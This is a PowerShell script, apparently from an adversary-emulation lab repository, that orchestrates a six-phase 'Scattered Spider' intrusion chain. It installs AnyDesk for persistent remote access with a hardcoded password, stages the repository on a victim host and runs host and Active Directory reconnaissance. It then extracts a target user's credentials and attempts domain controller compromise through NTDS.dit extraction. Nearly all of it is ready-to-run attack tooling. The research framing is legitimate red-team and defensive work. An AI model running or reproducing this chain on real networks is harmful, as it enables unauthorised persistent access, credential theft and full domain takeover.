# === Complete Attack Chain Deployment ===
# Simulates full Scattered Spider attack vector for security research
# Phase 1: AnyDesk + Git → Phase 2: Repository Clone → Phase 3: Host Recon → Phase 4: AD Recon → Phase 5: Post-Exploit Cred Extraction → Phase 6: Post-Exploit DC Compromise

param(
    [string]$OrganizationID = "SecurityLab",
    [string]$AdminPassword = "ITSupport2024!",
    [string]$TargetUser = "Sherlock",
    [string]$DomainAdminUsername = "",
    [string]$DomainAdminPassword = "",
    [switch]$SkipAnyDesk = $false,
    [switch]$AutoRecon = $false,
    [switch]$FullAttackChain = $false
)

Write-Host "========================================" -ForegroundColor Magenta
Write-Host " SCATTERED SPIDER - COMPLETE CHAIN" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host ""

$currentPath = Get-Location
Write-Host "[*] Current working directory: $currentPath" -ForegroundColor Gray
Write-Host ""

# Phase 1: Initial Foothold (AnyDesk + Git)
if (-not $SkipAnyDesk) {
    Write-Host "=== PHASE 1: INITIAL FOOTHOLD ===" -ForegroundColor Cyan
    Write-Host "[*] Deploying AnyDesk for persistent remote access..." -ForegroundColor Yellow
    
    $anyDeskScript = ".\IT_AnyDesk_Support\IT_AnyDesk_Deployment.ps1"
    if (Test-Path $anyDeskScript) {
        try {
            & $anyDeskScript -OrganizationID $OrganizationID -AdminPassword $AdminPassword
            Write-Host "[+] Phase 1 Complete: Remote access established with Git CLI ready" -ForegroundColor Green
        }
        catch {
            Write-Error "Phase 1 failed: $($_.Exception.Message)"
            exit 1
        }
    } else {
        Write-Error "AnyDesk deployment script not found: $anyDeskScript"
        exit 1
    }
} else {
    Write-Host "=== PHASE 1: SKIPPED (AnyDesk) ===" -ForegroundColor Yellow
    Write-Host "[*] Verifying Git CLI for repository operations..." -ForegroundColor Cyan
    
    try {
        $null = git --version 2>$null
        if ($LASTEXITCODE -eq 0) {
            $gitVersion = git --version
            Write-Host "[+] Git CLI available: $gitVersion" -ForegroundColor Green
        } else {
            Write-Warning "Git CLI not found. Repository cloning may require manual Git installation."
        }
    }
    catch {
        Write-Warning "Git CLI not found. Repository cloning may require manual Git installation."
    }
}

Write-Host ""

# Phase 2: Repository Staging (Simulated)
Write-Host "=== PHASE 2: REPOSITORY STAGING ===" -ForegroundColor Cyan
Write-Host "[*] In real scenario, attacker would now:" -ForegroundColor Yellow
Write-Host "    1. Clone this repository to victim host" -ForegroundColor Gray
Write-Host "    2. Navigate to cloned directory" -ForegroundColor Gray
Write-Host "    3. Execute reconnaissance deployment" -ForegroundColor Gray
Write-Host ""
Write-Host "[*] Repository clone command (for reference):" -ForegroundColor Yellow
Write-Host "    git clone https://github.com/Jonathan-D-a-v-i-d/Scattered_Spider.git" -ForegroundColor Gray
Write-Host "    cd Scattered_Spider" -ForegroundColor Gray
Write-Host ""

# Phase 3: Host Reconnaissance Deployment
Write-Host "=== PHASE 3: HOST RECONNAISSANCE ===" -ForegroundColor Cyan

$hostReconScript = ".\Deploy_VictimHostRecon.ps1"
if (Test-Path $hostReconScript) {
    Write-Host "[*] Deploying host reconnaissance..." -ForegroundColor Yellow
    
    try {
        if ($AutoRecon -or $FullAttackChain) {
            # Auto-execute reconnaissance
            & $hostReconScript
            Write-Host ""
            Write-Host "[*] Auto-executing host reconnaissance..." -ForegroundColor Cyan
            Import-Module ".\Recon\Host\VictimHostRecon.psm1" -Force
            Invoke-FullReconnaissance
        } else {
            # Just prepare the module
            & $hostReconScript
        }
        
        Write-Host "[+] Phase 3 Complete: Host reconnaissance deployed" -ForegroundColor Green
    }
    catch {
        Write-Error "Phase 3 failed: $($_.Exception.Message)"
        exit 1
    }
} else {
    Write-Error "Host reconnaissance deployment script not found: $hostReconScript"
    exit 1
}

Write-Host ""

# Phase 4: Active Directory Reconnaissance
if ($AutoRecon -or $FullAttackChain) {
    Write-Host "=== PHASE 4: ACTIVE DIRECTORY RECONNAISSANCE ===" -ForegroundColor Cyan
    
    $adReconScript = ".\Deploy_ADRecon.ps1"
    if (Test-Path $adReconScript) {
        Write-Host "[*] Deploying AD reconnaissance..." -ForegroundColor Yellow
        
        try {
            # Auto-execute AD reconnaissance
            & $adReconScript -AutoExecute
            
            Write-Host "[+] Phase 4 Complete: AD reconnaissance deployed and executed" -ForegroundColor Green
        }
        catch {
            Write-Error "Phase 4 failed: $($_.Exception.Message)"
            if (-not $FullAttackChain) { exit 1 }
        }
    } else {
        Write-Host "[!] AD reconnaissance deployment script not found: $adReconScript" -ForegroundColor Yellow
        if (-not $FullAttackChain) { exit 1 }
    }
    
    Write-Host ""
}

# Phase 5: Post-Exploitation - Credential Extraction (if full attack chain)
if ($FullAttackChain) {
    Write-Host "=== PHASE 5: POST-EXPLOIT - CREDENTIAL EXTRACTION ===" -ForegroundColor Cyan
    
    $credExtractionScript = ".\Deploy_CredExtraction.ps1"
    if (Test-Path $credExtractionScript) {
        Write-Host "[*] Deploying credential extraction (targeting $TargetUser)..." -ForegroundColor Yellow
        
        try {
            # Auto-execute credential extraction
            & $credExtractionScript -TargetUser $TargetUser -AutoExecute
            
            Write-Host "[+] Phase 5 Complete: Credential extraction executed" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] Phase 5 failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "[!] Continuing without extracted credentials..." -ForegroundColor Yellow
        }
    } else {
        Write-Host "[!] Credential extraction deployment script not found: $credExtractionScript" -ForegroundColor Yellow
    }
    
    Write-Host ""
}

# Phase 6: Post-Exploitation - Domain Controller Compromise (if full attack chain and credentials available)
if ($FullAttackChain -and ($DomainAdminUsername -and $DomainAdminPassword)) {
    Write-Host "=== PHASE 6: POST-EXPLOIT - DOMAIN CONTROLLER COMPROMISE ===" -ForegroundColor Cyan
    
    $dcCompromiseScript = ".\Deploy_DCCompromise.ps1"
    if (Test-Path $dcCompromiseScript) {
        Write-Host "[*] Deploying DC compromise using domain admin credentials..." -ForegroundColor Yellow
        
        try {
            # Auto-execute DC compromise
            & $dcCompromiseScript -Username $DomainAdminUsername -Password $DomainAdminPassword -AutoExecute
            
            Write-Host "[+] Phase 6 Complete: DC compromise executed - NTDS.dit extraction attempted" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] Phase 6 failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "[!] DC compromise requires valid domain admin credentials and proper access" -ForegroundColor Yellow
        }
    } else {
        Write-Host "[!] DC compromise deployment script not found: $dcCompromiseScript" -ForegroundColor Yellow
    }
    
    Write-Host ""
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Magenta
Write-Host " ATTACK CHAIN DEPLOYMENT COMPLETE" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host ""

Write-Host "Summary:" -ForegroundColor Green
if (-not $SkipAnyDesk) {
    Write-Host "✓ Phase 1: Remote access established via AnyDesk" -ForegroundColor Green
}
Write-Host "✓ Phase 2: Git CLI available for repository operations" -ForegroundColor Green
Write-Host "✓ Phase 3: Host reconnaissance framework deployed" -ForegroundColor Green
if ($AutoRecon -or $FullAttackChain) {
    Write-Host "✓ Phase 4: Active Directory reconnaissance executed" -ForegroundColor Green
}
if ($FullAttackChain) {
    Write-Host "✓ Phase 5: Credential extraction attempted (target: $TargetUser)" -ForegroundColor Green
    if ($DomainAdminUsername -and $DomainAdminPassword) {
        Write-Host "✓ Phase 6: DC compromise executed - NTDS.dit extraction attempted" -ForegroundColor Green
    } else {
        Write-Host "⚠ Phase 6: Skipped (no domain admin credentials provided)" -ForegroundColor Yellow
    }
}
Write-Host "✓ Output directory: C:\Intel\Logs" -ForegroundColor Green
Write-Host ""

if ($FullAttackChain) {
    Write-Host "Complete Attack Chain Results:" -ForegroundColor Yellow
    Write-Host "- Lab Scenario: Irene (local admin) → $TargetUser (domain admin) credential extraction" -ForegroundColor Gray
    Write-Host "- Techniques: T1082, T1087, T1057, T1518, T1046, T1083, T1087.002, T1615, T1018, T1482, T1555, T1003, T1003.003" -ForegroundColor Gray
    Write-Host "- Domain Compromise: NTDS.dit extraction for complete domain takeover" -ForegroundColor Gray
} else {
    Write-Host "Next Steps:" -ForegroundColor Yellow
    Write-Host "- Use AnyDesk ID and password for remote connection" -ForegroundColor Gray
    Write-Host "- Execute individual phases: .\Deploy_CredExtraction.ps1, .\Deploy_DCCompromise.ps1" -ForegroundColor Gray
    Write-Host "- For full chain: .\Deploy_Complete_Chain.ps1 -FullAttackChain -DomainAdminUsername <user> -DomainAdminPassword <pass>" -ForegroundColor Gray
}
Write-Host "- Access results in: C:\Intel\Logs\" -ForegroundColor Gray

if (-not $AutoRecon) {
    Write-Host ""
    $executeRecon = Read-Host "Execute reconnaissance now? (y/N)"
    if ($executeRecon -eq 'y' -or $executeRecon -eq 'Y') {
        Write-Host ""
        Write-Host "[*] Executing full victim host reconnaissance..." -ForegroundColor Cyan
        Import-Module ".\Recon\Host\VictimHostRecon.psm1" -Force
        Invoke-FullReconnaissance
    }
}